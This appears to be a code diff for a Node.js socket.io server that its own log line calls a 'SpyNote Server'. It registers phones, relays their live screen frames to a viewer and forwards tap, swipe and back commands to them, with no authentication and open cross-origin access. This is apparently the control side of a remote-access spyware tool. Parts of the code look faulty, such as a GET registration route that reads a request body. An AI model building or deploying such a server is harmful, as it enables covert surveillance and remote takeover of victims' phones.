@@ -1,71 +1,87 @@
 const express = require('express');
 const http = require('http');
-const WebSocket = require('ws');
+const socketIo = require('socket.io');
 const path = require('path');
 const compression = require('compression');
 
 const app = express();
 const server = http.createServer(app);
-const wss = new WebSocket.Server({ server });
+const io = socketIo(server, {
+    cors: { origin: "*", methods: ["GET", "POST"] },
+    pingTimeout: 60000
+});
 
 app.use(compression());
-app.use(express.static(__dirname));
-app.use('/css', express.static(path.join(__dirname, 'style.css')));
-app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
+app.use(express.static('public'));
+app.use(express.json());
 
+// Store connected devices
 const devices = new Map();
-const deviceLayouts = new Map();
 
-wss.on('connection', (ws) => {
-    ws.on('message', (message) => {
-        try {
-            const data = message.toString();
-            if (data.startsWith('REGISTER:')) {
-                const deviceId = data.split(':')[1];
-                devices.set(deviceId, ws);
-                console.log(`Device registered: ${deviceId}`);
-                ws.deviceId = deviceId;
-            } else {
-                const parsed = JSON.parse(data);
-                if (parsed.type === 'LAYOUT') {
-                    deviceLayouts.set(parsed.deviceId, parsed.layout);
-                    broadcastLayout(parsed.deviceId, parsed.layout);
-                }
-            }
-        } catch (e) {
-            console.error('Message error:', e);
-        }
-    });
+app.get('/register', (req, res) => {
+    const { deviceId, model, version } = req.body;
+    if (deviceId) {
+        devices.set(deviceId, { model, version, status: 'online' });
+    }
+    res.json({ success: true });
+});
 
-    ws.on('close', () => {
-        if (ws.deviceId) {
-            devices.delete(ws.deviceId);
-            deviceLayouts.delete(ws.deviceId);
-            console.log(`Device disconnected: ${ws.deviceId}`);
-        }
+app.get('/devices', (req, res) => {
+    res.json(Array.from(devices.entries()));
+});
+
+io.on('connection', (socket) => {
+    console.log('New connection:', socket.id);
+
+    socket.on('disconnect', () => {
+        console.log('Disconnected:', socket.id);
     });
 });
 
-function broadcastLayout(deviceId, layout) {
-    // Broadcast to web clients
-    wss.clients.forEach(client => {
-        if (!client.deviceId && client.readyState === WebSocket.OPEN) {
-            client.send(JSON.stringify({
-                type: 'LAYOUT_UPDATE',
-                deviceId,
-                layout: JSON.parse(layout)
-            }));
-        }
+// Device connections
+io.on('connection', (socket) => {
+    socket.on('screen-frame', (data) => {
+        const { deviceId, width, height, data: frameData } = data;
+        socket.to(deviceId).emit('screen-update', data);
     });
-}
+});
 
-function sendControl(deviceId, action, params) {
-    const ws = devices.get(deviceId);
-    if (ws && ws.readyState === WebSocket.OPEN) {
-        ws.send(JSON.stringify({ action, params }));
-    }
-}
+// Control handlers
+io.on('connection', (socket) => {
+    // Select device
+    socket.on('select-device', (deviceId) => {
+        socket.join(deviceId);
+        socket.emit('device-selected', deviceId);
+    });
 
-server.listen(8080, () => {
-    console.log('Server running on http://localhost:8080');
+    // Touch controls
+    socket.on('tap', (data) => {
+        const { deviceId, x, y } = data;
+        io.to(deviceId).emit('control', {
+            action: 'tap',
+            x: x * 1080/400, // Scale to device resolution
+            y: y * 1920/800
+        });
+    });
+
+    socket.on('swipe', (data) => {
+        const { deviceId, startX, startY, endX, endY } = data;
+        io.to(deviceId).emit('control', {
+            action: 'swipe',
+            startX: startX * 1080/400,
+            startY: startY * 1920/800,
+            endX: endX * 1080/400,
+            endY: endY * 1920/800
+        });
+    });
+
+    socket.on('back', (data) => {
+        const { deviceId } = data;
+        io.to(deviceId).emit('control', { action: 'back' });
+    });
+});
+
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => {
+    console.log(`SpyNote Server running on port ${PORT}`);
 });
